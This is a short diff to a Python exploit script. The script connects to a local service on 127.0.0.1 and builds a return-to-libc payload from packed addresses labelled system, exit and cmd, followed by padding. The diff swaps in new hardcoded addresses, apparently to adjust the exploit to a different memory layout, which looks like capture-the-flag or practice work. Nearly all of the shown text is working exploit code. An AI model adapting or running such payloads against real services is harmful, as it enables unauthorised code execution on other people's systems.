@@ -15,9 +15,10 @@ sock = socket.create_connection(('127.0.0.1', port),
 
 p = ''
 
-p += pack('<I', 0xf7e59080) #system
-p += pack('<I', 0x08048bb4) #exit
-p += pack('<I', 0xffffcfff) #cmd
+p += pack('<I', 0xf7e5a080) #system
+#p += pack('<I', 0xf7e4c7b0)
+p += pack('<I', 0xf7e4c7b0) #exit
+p += pack('<I', 0xffffceff) #cmd
 p += pack('<I', 0xffffc850)
 p += pack('<I', 0xffffc850)
 p += ' '*500
